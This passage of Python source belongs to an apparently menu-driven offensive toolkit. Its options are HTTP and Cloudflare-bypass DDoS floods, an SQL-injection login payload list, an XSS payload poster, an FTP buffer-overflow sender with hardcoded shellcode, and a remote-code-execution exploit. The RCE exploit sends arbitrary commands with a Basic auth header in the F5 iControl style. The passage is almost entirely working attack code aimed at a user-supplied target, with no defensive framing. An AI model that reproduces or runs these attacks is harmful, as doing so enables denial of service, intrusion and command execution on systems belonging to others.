                'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
            headers_useragents.append(
                'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
            headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
            headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
            headers_useragents.append(
                'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
            headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
            headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
            headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
        header_append()

        def ddos(url, threads):
            s = requests.session()


            def do_req():
                global count
                while True:
                    response = s.get(url, headers=random.choice(headers_useragents))
                    count += 1

                    response2 = requests.get(url, headers=random.choice(headers_useragents))
                    response3 = urlopen(url)


                    response3.add_header(random.choice(headers_useragents))

                    print(f"{response}, Request Number: {count} ")
                    print(f"{response2}, Request Number: {count} ")
                    print(f"{response3}, Request Number: {count} ")

            threads_number = []

            for i in range(int(threads)):
                t = threading.Thread(target=do_req)
                t.daemon = True
                threads_number.append(t)

            for i in range(int(threads)):
                threads_number[i].start()

            for i in range(int(threads)):
                threads_number[i].join()

        print(
            """
             ____  ____       ____  
            |  _ \|  _ \  ___/ ___| 
            | | | | | | |/ _ \___ \   ~>DDoS<~
            | |_| | |_| | (_) |__) | ~~>Made by tfwcodes(github)<~~
            |____/|____/ \___/____/ 
                        
            
            """
        )

        url = input("[+] Enter the target url: ")
        number_threads = input("[+] Enter the number of threads: ")
        ddos(url, number_threads)

    elif choice == "4":

        # check the target url
        def check_url(url):
            try:
                cloudfare_check_url = requests.Session()
                response = cloudfare_check_url.get(url)
                if response.status_code == 200:
                    print("[INFO] The url is valid")
                elif response.status_code == 404:
                    print("[INFO] The url is invalid")
            except:
                bypass = cloudscraper.create_scraper()
                response2 = bypass.get(url)
                if response2.status_code == 200:
                    print("[INFO]The url is valid")
                elif response2.status_code == 404:
                    print("[INFO] The url is invalid")


        count = 0


        # ddos cloudfare
        def bypass(url, threads):

            r = requests.Session()
            bypass2 = cloudscraper.create_scraper()

            def do_req():
                global count
                while True:
                    response = r.get(url)
                    count += 1

                    print("\n" + f"[ATTACK] Status code: {response.status_code} Request number: {count}" + "\n")

                    response = bypass2.get(url)
                    print("\n" + f"[ATTACK] Status code: {response.status_code} Request number: {count}" + "\n")

            list_of_threads = []

            for i in range(int(threads)):
                t = threading.Thread(target=do_req)
                t.daemon = True
                # appending all the threads to the list of threads
                list_of_threads.append(t)

            for i in range(int(threads)):
                # starting the threads
                list_of_threads[i].start()

            for i in range(int(threads)):
                # joining the threads
                list_of_threads[i].join()


        print(
            """
    
              ____ _                 _  __                  ____  ____       ____  
             / ___| | ___  _   _  __| |/ _| __ _ _ __ ___  |  _ \|  _ \  ___/ ___|   ~>Cloudfare DDoS<~ 
            | |   | |/ _ \| | | |/ _` | |_ / _` | '__/ _ \ | | | | | | |/ _ \___ \  ~~>Made by tfwcodes(github)<~~
            | |___| | (_) | |_| | (_| |  _| (_| | | |  __/ | |_| | |_| | (_) |__) |
             \____|_|\___/ \__,_|\__,_|_|  \__,_|_|  \___| |____/|____/ \___/____/ 
    
    
            """
        )

        url = input("[INFO] Enter the target url: ")
        check_url(url)
        sleep(1)

        threads = input("[INFO] Enter the number of threads: ")
        bypass(url, threads)

    elif choice == "5":
        count = 0


        def check_website(target):
            ip = socket.gethostbyname(target)
            try:
                IPv4Address(ip)
                ip_address(ip)
                pass
            except:
                print("[INFO] The target website is invalid")
                input()
                exit()

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((ip, 80))
                print("[INFO] The target website is valid")
            except:
                try:
                    s.connect((ip, 443))
                    print("[INFO] The target website is valid")

                except:
                    print("[INFO] The target website is invalid")
                    input()
                    exit()


        def attack(target):

            file = open("target_vulnerabilities", "w")

            global count
            usr_payload = [
                '-',
                ' ',
                '&',
                '^',
                '*',
                ' or ''-',
                ' or '' ',
                ' or ''&',
                ' or ''^',
                ' or ''*',
                "-",
                " ",
                "&",
                "^",
                "*",
                " or ""-",
                " or "" ",
                " or ""&",
                " or ""^",
                " or ""*",
                "' or true--",
                "'') or true--",
                "') or true--",
                ")) or (('x'))=(('x",
                "or 1 = 1",
                ' AND 1=0 UNION ALL SELECT ',
                ",",
                "admin",
                " or ",
                "1",
                "=",
                "1",
                "/*",
                "or 1=1 or '='",
                " or 1=1--"
            ]

            for word in usr_payload:
                data = {
                    'rcr_authenticate': '1',
                    'rcr_user': word,
                    'rcr_pass': "*/--",
                    'rcr_submit': 'Conectare'
                }

                s = requests.session()
                response_sql = s.post(target, data=data)
                count += 1

                s2 = requests.session()

                exploit_url = f"{target}/{word}"
                exploit_2 = s2.get(exploit_url)

                print(
                    f"[ATTACK] (Exploit 1) Trying: {word} , With the password */--, Content-length: {response_sql.headers['content-length']}, Attempt number: {count}" + "\n")
                sleep(0.3)

                if exploit_2.status_code == 200:
                    print(
                        f"[ATTACK] (Exploit 2) Vulnerability found on url: {exploit_url} with the query {word}" + "\n")
                    file.write("Vulnerable query: " + word + " with the url " + exploit_url + "\n")
                    sleep(0.3)
                elif exploit_2.status_code == 404:
                    print(f"[ATTACK] (Exploit 2) Not vulnerable on url: {exploit_url}" + "\n")
                    sleep(0.3)

            file.close()


        print(
            """

            ____   ___  _       ____                                  
           / ___| / _ \| |     / ___|  ___ __ _ _ __  _ __   ___ _ __ 
           \___ \| | | | |     \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|  ~>SQL Scanner<~
            ___) | |_| | |___   ___) | (_| (_| | | | | | | |  __/ |    ~~>Made by tfwcodes(github)<~~ 
           |____/ \__\_\_____| |____/ \___\__,_|_| |_|_| |_|\___|_|   


            """
        )

        domain_name = input("[+] Enter the domain name of the target website: ")
        check_website(domain_name)

        url_sql = input("[+] Enter the target url: ")

        attack(url_sql)

    elif choice == "6":
        count = 0


        def check_url_xss(url):
            try:
                s2 = requests.session()
                response = s2.get(url)
                if response.status_code == 200:
                    print("[INFO] The url is valid")
                elif response.status_code == 404:
                    print("[INFO] The url is invalid")
                    sleep(1)
                    exit()
            except KeyboardInterrupt:
                exit()


        def do_req(url):
            global count
            payload = open("payloads", "r")
            for word in payload:
                data = {
                    'rcr_authenticate': '1',
                    'rcr_user': 'sfds',
                    'rcr_pass': word,
                    'rcr_submit': 'Conectare'
                }

                s = requests.session()
                response = s.post(url, data=data)
                count += 1

                content_length = response.headers['content-length']
                print("-" * 50)
                print(f"[ATTACK] Content-length: {content_length}, Request number: {count}, with the payload {word}")
                print("-" * 50)


        print(
            """

            __  ______ ____    ____                                  
            \ \/ / ___/ ___|  / ___|  ___ __ _ _ __  _ __   ___ _ __ 
             \  /\___ \___ \  \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
             /  \ ___) |__) |  ___) | (_| (_| | | | | | | |  __/ |    ~>XSS Scanner<~
            /_/\_\____/____/  |____/ \___\__,_|_| |_|_| |_|\___|_|  ~~>Made by tfwcodes(github)<~~ 

            """
        )

        url = input("[+] Enter the target url: ")
        check_url_xss(url)
        sleep(1)
        do_req(url)

    elif choice == "7":
        buffer = []

        counter = 100

        shellcode = ("\xba\x3e\x9a\x17\x22\xdb\xcd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
                     "\x52\x31\x55\x12\x83\xed\xfc\x03\x6b\x94\xf5\xd7\x6f\x40\x7b"
                     "\x17\x8f\x91\x1c\x91\x6a\xa0\x1c\xc5\xff\x93\xac\x8d\xad\x1f"
                     "\x46\xc3\x45\xab\x2a\xcc\x6a\x1c\x80\x2a\x45\x9d\xb9\x0f\xc4"
                     "\x1d\xc0\x43\x26\x1f\x0b\x96\x27\x58\x76\x5b\x75\x31\xfc\xce"
                     "\x69\x36\x48\xd3\x02\x04\x5c\x53\xf7\xdd\x5f\x72\xa6\x56\x06"
                     "\x54\x49\xba\x32\xdd\x51\xdf\x7f\x97\xea\x2b\x0b\x26\x3a\x62"
                     "\xf4\x85\x03\x4a\x07\xd7\x44\x6d\xf8\xa2\xbc\x8d\x85\xb4\x7b"
                     "\xef\x51\x30\x9f\x57\x11\xe2\x7b\x69\xf6\x75\x08\x65\xb3\xf2"
                     "\x56\x6a\x42\xd6\xed\x96\xcf\xd9\x21\x1f\x8b\xfd\xe5\x7b\x4f"
                     "\x9f\xbc\x21\x3e\xa0\xde\x89\x9f\x04\x95\x24\xcb\x34\xf4\x20"
                     "\x38\x75\x06\xb1\x56\x0e\x75\x83\xf9\xa4\x11\xaf\x72\x63\xe6"
                     "\xd0\xa8\xd3\x78\x2f\x53\x24\x51\xf4\x07\x74\xc9\xdd\x27\x1f"
                     "\x09\xe1\xfd\xb0\x59\x4d\xae\x70\x09\x2d\x1e\x19\x43\xa2\x41"
                     "\x39\x6c\x68\xea\xd0\x97\xfb\xd5\x8d\x96\xdc\xbd\xcf\x98\x23"
                     "\x85\x59\x7e\x49\xe9\x0f\x29\xe6\x90\x15\xa1\x97\x5d\x80\xcc"
                     "\x98\xd6\x27\x31\x56\x1f\x4d\x21\x0f\xef\x18\x1b\x86\xf0\xb6"
                     "\x33\x44\x62\x5d\xc3\x03\x9f\xca\x94\x44\x51\x03\x70\x79\xc8"
                     "\xbd\x66\x80\x8c\x86\x22\x5f\x6d\x08\xab\x12\xc9\x2e\xbb\xea"
                     "\xd2\x6a\xef\xa2\x84\x24\x59\x05\x7f\x87\x33\xdf\x2c\x41\xd3"
                     "\xa6\x1e\x52\xa5\xa6\x4a\x24\x49\x16\x23\x71\x76\x97\xa3\x75"
                     "\x0f\xc5\x53\x79\xda\x4d\x63\x30\x46\xe7\xec\x9d\x13\xb5\x70"
                     "\x1e\xce\xfa\x8c\x9d\xfa\x82\x6a\xbd\x8f\x87\x37\x79\x7c\xfa"
                     "\x28\xec\x82\xa9\x49\x25")

        string = 247 * "X" + "\x13\x4F\x87\x7C" + 20 * "\x90" + shellcode

        buffer.append(string)


        def check_ip(ip):
            try:
                ip_address(ip)
                print("[INFO] The ip is valid")
            except:
                print("[INFO] The ip is not valid")
                input()
                exit()


        def check_ftp(ip):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 21))
                return True
            except:
                return False


        def attack(ip):
            for payload in buffer:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, 21))

                    buffszie = int(1024)

                    print(f"{s.recv(buffszie)} received from the target")

                    msg = "USER " + payload + "\r\n"

                    s.send(msg.encode("utf-8"))
                    print(f"{s.recv(buffszie)} received from the target")

                    print("Fuzzing PASS")

                    msg2 = "PASS " + payload + "\r\n"
                    s.send(msg2.encode("utf-8"))
                    print(f"{s.recv(buffszie)} received from the target")
                    s.close()

                except:
                    print(f"The target {ip}:21 is not vulnerable")


        print(
            """

                                 _____              _               _____ _____ ____  
                                |  ___|   _ _______(_)_ __   __ _  |  ___|_   _|  _ \   ~>Fuzzing FTP<~
                                | |_ | | | |_  /_  / | '_ \ / _` | | |_    | | | |_) | ~~>Made by tfwcodes(github)<~~
                                |  _|| |_| |/ / / /| | | | | (_| | |  _|   | | |  __/ 
                                |_|   \__,_/___/___|_|_| |_|\__, | |_|     |_| |_|    
                                                            |___/                     


             """
        )
        ip_target = input("[+] Enter the target ip: ")
        check_ip(ip_target)
        ftp_check = check_ftp(ip_target)
        if ftp_check:
            print("[INFO] FTP is enabled")
            attack(ip_target)
        else:
            print("[INFO] FTP is disabled")
            input()
            exit()

    elif choice == "8":
        print(
            """
            
             _____              _               ____ ____  _   _ 
            |  ___|   _ _______(_)_ __   __ _  / ___/ ___|| | | |
            | |_ | | | |_  /_  / | '_ \ / _` | \___ \___ \| |_| |  ~>Fuzzing SSH<~
            |  _|| |_| |/ / / /| | | | | (_| |  ___) |__) |  _  | ~~>Made by tfwcodes(github)<~~
            |_|   \__,_/___/___|_|_| |_|\__, | |____/____/|_| |_|
                                        |___/                    
            
            """
        )

        buffer = []

        counter = 100

        shellcode = ("\xba\x3e\x9a\x17\x22\xdb\xcd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
                     "\x52\x31\x55\x12\x83\xed\xfc\x03\x6b\x94\xf5\xd7\x6f\x40\x7b"
                     "\x17\x8f\x91\x1c\x91\x6a\xa0\x1c\xc5\xff\x93\xac\x8d\xad\x1f"
                     "\x46\xc3\x45\xab\x2a\xcc\x6a\x1c\x80\x2a\x45\x9d\xb9\x0f\xc4"
                     "\x1d\xc0\x43\x26\x1f\x0b\x96\x27\x58\x76\x5b\x75\x31\xfc\xce"
                     "\x69\x36\x48\xd3\x02\x04\x5c\x53\xf7\xdd\x5f\x72\xa6\x56\x06"
                     "\x54\x49\xba\x32\xdd\x51\xdf\x7f\x97\xea\x2b\x0b\x26\x3a\x62"
                     "\xf4\x85\x03\x4a\x07\xd7\x44\x6d\xf8\xa2\xbc\x8d\x85\xb4\x7b"
                     "\xef\x51\x30\x9f\x57\x11\xe2\x7b\x69\xf6\x75\x08\x65\xb3\xf2"
                     "\x56\x6a\x42\xd6\xed\x96\xcf\xd9\x21\x1f\x8b\xfd\xe5\x7b\x4f"
                     "\x9f\xbc\x21\x3e\xa0\xde\x89\x9f\x04\x95\x24\xcb\x34\xf4\x20"
                     "\x38\x75\x06\xb1\x56\x0e\x75\x83\xf9\xa4\x11\xaf\x72\x63\xe6"
                     "\xd0\xa8\xd3\x78\x2f\x53\x24\x51\xf4\x07\x74\xc9\xdd\x27\x1f"
                     "\x09\xe1\xfd\xb0\x59\x4d\xae\x70\x09\x2d\x1e\x19\x43\xa2\x41"
                     "\x39\x6c\x68\xea\xd0\x97\xfb\xd5\x8d\x96\xdc\xbd\xcf\x98\x23"
                     "\x85\x59\x7e\x49\xe9\x0f\x29\xe6\x90\x15\xa1\x97\x5d\x80\xcc"
                     "\x98\xd6\x27\x31\x56\x1f\x4d\x21\x0f\xef\x18\x1b\x86\xf0\xb6"
                     "\x33\x44\x62\x5d\xc3\x03\x9f\xca\x94\x44\x51\x03\x70\x79\xc8"
                     "\xbd\x66\x80\x8c\x86\x22\x5f\x6d\x08\xab\x12\xc9\x2e\xbb\xea"
                     "\xd2\x6a\xef\xa2\x84\x24\x59\x05\x7f\x87\x33\xdf\x2c\x41\xd3"
                     "\xa6\x1e\x52\xa5\xa6\x4a\x24\x49\x16\x23\x71\x76\x97\xa3\x75"
                     "\x0f\xc5\x53\x79\xda\x4d\x63\x30\x46\xe7\xec\x9d\x13\xb5\x70"
                     "\x1e\xce\xfa\x8c\x9d\xfa\x82\x6a\xbd\x8f\x87\x37\x79\x7c\xfa"
                     "\x28\xec\x82\xa9\x49\x25")

        string = 247 * "X" + "\x13\x4F\x87\x7C" + 20 * "\x90" + shellcode

        buffer.append(string)


        def check_ip(ip):
            try:
                ip_address(ip)
                print("[INFO] The ip is valid")
            except:
                print("[INFO] The ip is not valid")
                input()
                exit()


        def check_ftp(ip):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 21))
                return True
            except:
                return False


        def attack(ip):
            for payload in buffer:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, 21))

                    buffszie = int(1024)

                    print(f"{s.recv(buffszie)} received from the target")

                    msg = "USER " + payload + "\r\n"

                    s.send(msg.encode("utf-8"))
                    print(f"{s.recv(buffszie)} received from the target")

                    print("Fuzzing PASS")

                    msg2 = "PASS " + payload + "\r\n"
                    s.send(msg2.encode("utf-8"))
                    print(f"{s.recv(buffszie)} received from the target")
                    s.close()

                except:
                    print(f"The target {ip}:22 is not vulnerable")


        ip_target = input("[+] Enter the target ip: ")
        check_ip(ip_target)
        ftp_check = check_ftp(ip_target)
        if ftp_check:
            print("[INFO] SSH is enabled")
            attack(ip_target)
        else:
            print("[INFO] SSH is disabled")
            input()
    elif choice == "9":
        print(
            """

                                     ____                      _          ____          _      
                                    |  _ \ ___ _ __ ___   ___ | |_ ___   / ___|___   __| | ___ 
                                    | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ | |   / _ \ / _` |/ _ |
                                    |  _ <  __/ | | | | | (_) | ||  __/ | |__| (_) | (_| |  __/
                                    |_| \_\___|_| |_| |_|\___/ \__\___|  \____\___/ \__,_|\___|

                                     _____                     _   _               ~>Remote Code Execution<~
                                    | ____|_  _____  ___ _   _| |_(_) ___  _ __   ~~>Made by tfwcodes(github)<~~
                                    |  _| \ \/ / _ \/ __| | | | __| |/ _ \| '_ \ 
                                    | |___ >  <  __/ (__| |_| | |_| | (_) | | | |
                                    |_____/_/\_\___|\___|\__,_|\__|_|\___/|_| |_|



            """
        )


        def check_url(url):
            try:
                s2 = requests.session()
                s2.get(url)
                print("[INFO] The target url is valid")
            except:
                print("[INFO] The target url is invalid")
                input()
                exit()


        def attack(url, command):
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': '',
                'Authorization': 'Basic YWRtaW46QVNhc1M='
            }

            data = json.dumps({'command': 'run', 'utilCmdArgs': '-c' + command})

            s = requests.session()
            r = s.post(url, data=data, headers=headers, verify=False)
            if r.status_code == 200:
                print("[ATTACK] The target is vulnerable")

                response_from_target = r.text
                print("[ATTACK] response from the target: " + "\n" + "{}".format(response_from_target))
            else:
                print("[ATTACK] The target is not vulnerable")


        url_rce = input("[+] Enter the target url: ")
        check_url(url_rce)

        command_rce = input("[+] Enter the command to execute: ")
        attack(url_rce, command_rce)


